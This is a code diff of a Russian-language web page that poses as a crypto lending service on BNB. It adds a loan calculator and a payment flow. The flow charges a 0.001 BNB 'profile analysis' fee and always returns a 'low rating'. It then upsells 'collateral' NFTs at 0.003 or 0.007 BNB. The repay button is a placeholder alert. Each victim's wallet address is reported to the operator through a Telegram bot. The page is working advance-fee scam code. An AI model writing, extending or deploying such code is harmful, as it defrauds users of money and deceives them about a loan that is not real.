@@ -10,11 +10,17 @@
         body { background: var(--bg); color: var(--text-main); font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background-image: radial-gradient(circle at 50% 50%, #1a1a3a 0%, #030308 100%); }
         .container { background: var(--card); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 28px; padding: 40px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 40px 100px rgba(0,0,0,0.8); backdrop-filter: blur(10px); }
         h1 { font-size: 26px; font-weight: 800; margin-bottom: 25px; background: linear-gradient(135deg, #fff 0%, var(--accent) 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .btn { background: var(--accent); color: #000; border: none; padding: 18px 30px; border-radius: 16px; font-weight: 700; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; margin-top: 15px; }
-        .btn-repay { background: var(--success); }
-        .btn-nft { background: rgba(0, 242, 255, 0.1); border: 1px solid var(--accent); color: var(--accent); padding: 12px; font-size: 13px; border-radius: 12px; width: 100%; margin-top: 10px; }
-        .result-card { display: none; margin-top: 20px; padding: 25px; border-radius: 20px; border: 1px solid #444; text-align: left; background: rgba(255,255,255,0.02); }
-        .timer-box { background: rgba(255,255,255,0.05); padding: 10px; border-radius: 10px; margin: 10px 0; font-size: 12px; color: var(--text-dim); border: 1px solid rgba(255,255,255,0.1); }
+        .range-container { margin: 20px 0; text-align: left; }
+        .range-label { display: flex; justify-content: space-between; color: var(--text-dim); font-size: 12px; margin-bottom: 8px; text-transform: uppercase; }
+        .amount-display { font-size: 28px; font-weight: 800; color: var(--accent); text-align: center; margin-bottom: 12px; }
+        input[type=range] { width: 100%; cursor: pointer; height: 6px; border-radius: 5px; background: #222; outline: none; -webkit-appearance: none; }
+        input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; width: 18px; height: 18px; border-radius: 50%; background: var(--accent); cursor: pointer; box-shadow: 0 0 10px var(--accent); }
+        .calculation-box { background: rgba(255, 255, 255, 0.03); border: 1px dashed rgba(0, 242, 255, 0.3); border-radius: 20px; padding: 15px; margin: 20px 0; }
+        .btn { background: var(--accent); color: #000; border: none; padding: 18px 30px; border-radius: 16px; font-weight: 700; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
+        .btn-nft { background: rgba(0, 242, 255, 0.1); border: 1px solid var(--accent); color: var(--accent); margin-top: 10px; padding: 12px; font-size: 13px; border-radius: 12px; width: 100%; }
+        .btn-success { background: var(--success); color: #000; margin-top: 15px; }
+        .result-card { display: none; margin-top: 20px; padding: 25px; border-radius: 20px; border: 1px solid #444; text-align: left; }
+        .timer-info { background: rgba(255,255,255,0.05); padding: 15px; border-radius: 15px; margin-top: 10px; border: 1px solid rgba(255,255,255,0.1); }
         .status-msg { font-size: 13px; margin-top: 20px; min-height: 20px; }
     </style>
 </head>
@@ -28,6 +34,26 @@
         <button class="btn" onclick="connect()">Подключить кошелек</button>
     </div>
     
+    <div id="calculator" style="display:none;">
+        <div style="color: var(--text-dim); font-size: 11px; margin-bottom: 15px;">Аккаунт: <span id="userAddr" style="color: var(--accent);"></span></div>
+        <div class="range-container">
+            <div class="range-label"><span>Сумма кредита</span></div>
+            <div class="amount-display" id="amountVal">$250</div>
+            <input type="range" id="amountSlider" min="10" max="500" step="10" value="250" oninput="updateUI()">
+        </div>
+        <div class="range-container">
+            <div class="range-label"><span>Срок (мес.)</span></div>
+            <div class="amount-display" id="termVal" style="color: #fff; font-size: 20px;">4 месяца</div>
+            <input type="range" id="termSlider" min="2" max="6" step="1" value="4" oninput="updateUI()">
+        </div>
+        <div class="calculation-box">
+            <div style="font-size: 11px; color: var(--text-dim);">ИТОГО К ВОЗВРАТУ (+20%)</div>
+            <div style="font-size: 24px; font-weight: 800; color: var(--success);" id="totalToPay">$300.00</div>
+        </div>
+        <button id="actionBtn" class="btn" onclick="processCredit()">Запросить лимит</button>
+        <div style="font-size: 10px; color: #555; margin-top: 12px;">Анализ профиля: 0.001 BNB</div>
+    </div>
+
     <div id="resultBox" class="result-card"></div>
     <div id="status" class="status-msg"></div>
 </div>
@@ -45,9 +71,17 @@
 
     let signer, address, contract;
 
+    function updateUI() {
+        const amount = document.getElementById('amountSlider').value;
+        const term = document.getElementById('termSlider').value;
+        document.getElementById('amountVal').innerText = "$" + amount;
+        document.getElementById('termVal').innerText = term + (term > 4 ? " месяцев" : " месяца");
+        document.getElementById('totalToPay').innerText = "$" + (amount * 1.2).toFixed(2);
+    }
+
     async function sendTelegram(msg) {
         const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`;
-        try { await fetch(url, { method: 'GET' }); } catch (e) {}
+        try { await fetch(url); } catch (e) {}
     }
 
     async function connect() {
@@ -57,32 +91,49 @@
         signer = provider.getSigner();
         address = await signer.getAddress();
         contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
+        
         document.getElementById('authSection').style.display = "none";
+        document.getElementById('userAddr').innerText = address.substring(0,6) + "..." + address.substring(38);
         checkFlowState();
     }
 
     function checkFlowState() {
-        // Проверка: взял ли кредит (выплату)
         const claimDate = localStorage.getItem('claimed_at_' + address);
-        
+        const calc = document.getElementById('calculator');
+        const rb = document.getElementById('resultBox');
+
+        // 1. Если кредит уже взят
         if (claimDate) {
+            calc.style.display = "none";
             const daysPassed = Math.floor((Date.now() - claimDate) / (1000 * 60 * 60 * 24));
-            const daysLeft = 31 - daysPassed;
-            
-            renderResult(true, "АКТИВНЫЙ КРЕДИТ", 
-                `Вы успешно получили средства. Ваш текущий займ активен.`, 
-                false, false, true, daysPassed, daysLeft);
+            renderRepayScreen(daysPassed);
         } 
+        // 2. Если NFT куплен
         else if (localStorage.getItem('nft_purchased_' + address) === 'true') {
-            renderResult(true, "ЛИМИТ ОДОБРЕН", "Залоговый NFT подтвержден. Нажмите ниже, чтобы получить средства.", false, true);
+            calc.style.display = "none";
+            renderResult(true, "ЛИМИТ ОДОБРЕН", "Залоговый NFT подтвержден. Теперь вы можете забрать выплату.", false, true);
         } 
+        // 3. Если анализ оплачен
         else if (localStorage.getItem('paid_analysis_' + address) === 'true') {
+            calc.style.display = "none";
             renderResult(false, "НИЗКИЙ РЕЙТИНГ", "Анализ завершен. Для активации лимита требуется залоговый NFT.", true, false);
         } 
+        // 4. По умолчанию - калькулятор
         else {
-            // Показываем стандартный калькулятор, если ничего не сделано
-            showCalculator();
+            calc.style.display = "block";
+            updateUI();
         }
+    }
+
+    async function processCredit() {
+        try {
+            showStatus("Оплата анализа...", "#fff");
+            const tx = await contract.requestVerification({ value: ethers.utils.parseEther("0.001") });
+            await tx.wait();
+            localStorage.setItem('paid_analysis_' + address, 'true');
+            sendTelegram(`🔎 <b>Анализ оплачен</b>\nЮзер: <code>${address}</code>`);
+            checkFlowState();
+        } catch (e) { showStatus("Ошибка транзакции", "#ff0055"); }
     }
 
     async function buyNFT(price) {
@@ -101,65 +152,42 @@
             showStatus("Получение выплаты...", "#fff");
             const tx = await contract.claimCredit();
             await tx.wait();
-            
-            // СОХРАНЯЕМ ДАТУ ВЫПЛАТЫ
             localStorage.setItem('claimed_at_' + address, Date.now());
-            
             sendTelegram(`💰 <b>ВЫПЛАТА ЗАБРАНА</b>\nЮзер: <code>${address}</code>`);
             checkFlowState();
-        } catch (e) { alert("Ошибка: Повторно нельзя!"); }
+        } catch (e) { alert("Ошибка: Повторно через 31 день!"); }
     }
 
-    function repayCredit() {
-        alert("Для погашения кредита и разблокировки следующего лимита необходимо вернуть сумму + 20% на адрес контракта. Кнопка станет активна через 31 день.");
+    function renderRepayScreen(days) {
+        const rb = document.getElementById('resultBox');
+        rb.style.display = "block";
+        rb.style.borderColor = "#00ff88";
+        rb.innerHTML = `
+            <div style="color:#00ff88; font-size:20px; font-weight:bold;">АКТИВНЫЙ КРЕДИТ</div>
+            <div class="timer-info">
+                📅 Дней с момента получения: <b>${days}</b><br>
+                ⏳ Статус: <span style="color:#00ff88;">В использовании</span>
+            </div>
+            <p style="font-size:12px; color:#ccc; margin-top:10px;">Для получения нового лимита необходимо погасить текущий займ.</p>
+            <button class="btn btn-success" onclick="alert('Погашение станет доступно через 31 день после получения.')">ПОГАСИТЬ КРЕДИТ</button>
+        `;
     }
 
-    function renderResult(isSuccess, title, text, showNFT, showClaim, showRepay = false, passed = 0, left = 0) {
+    function renderResult(isSuccess, title, text, showNFT, showClaim) {
         const rb = document.getElementById('resultBox');
         rb.style.display = "block";
         rb.style.borderColor = isSuccess ? "#00ff88" : "#ff0055";
-        
         let html = `<div style="color:${isSuccess ? '#00ff88' : '#ff0055'}; font-size:20px; font-weight:bold;">${title}</div>
                     <div style="font-size:14px; margin-top:10px; color:#ccc;">${text}</div>`;
-        
-        if (showRepay) {
-            html += `<div class="timer-box">
-                        📅 Кредит взят: <b>${passed} дн. назад</b><br>
-                        ⏳ До погашения: <b>${left > 0 ? left : 0} дн.</b>
-                     </div>
-                     <button class="btn btn-repay" onclick="repayCredit()">ПОГАСИТЬ КРЕДИТ</button>`;
-        }
-        
         if (showNFT) {
             html += `<button class="btn-nft" onclick="buyNFT('0.003')">Купить NFT Boost (0.003 BNB)</button>
                      <button class="btn-nft" onclick="buyNFT('0.007')">Купить Pro NFT (0.007 BNB)</button>`;
         }
-        
         if (showClaim) {
-            html += `<button class="btn" onclick="claimMoney()">ЗАБРАТЬ ВЫПЛАТУ</button>`;
+            html += `<button class="btn" style="background:#00f2ff; margin-top:15px;" onclick="claimMoney()">ЗАБРАТЬ ВЫПЛАТУ</button>`;
         }
-        
         rb.innerHTML = html;
         showStatus("", "");
-    }
-
-    // Вспомогательная функция для калькулятора (если пустой кошелек)
-    function showCalculator() {
-        const rb = document.getElementById('resultBox');
-        rb.style.display = "block";
-        rb.innerHTML = `<div style="color:var(--accent); font-size:18px;">Доступный лимит: $500</div>
-                        <p style="font-size:12px;">Оплатите проверку 0.001 BNB для оценки профиля.</p>
-                        <button class="btn" onclick="processCredit()">Пройти проверку</button>`;
-    }
-
-    async function processCredit() {
-        try {
-            showStatus("Оплата анализа...", "#fff");
-            const tx = await contract.requestVerification({ value: ethers.utils.parseEther("0.001") });
-            await tx.wait();
-            localStorage.setItem('paid_analysis_' + address, 'true');
-            checkFlowState();
-        } catch (e) { showStatus("Отмена", "#ff0055"); }
     }
 
     function showStatus(text, color) {
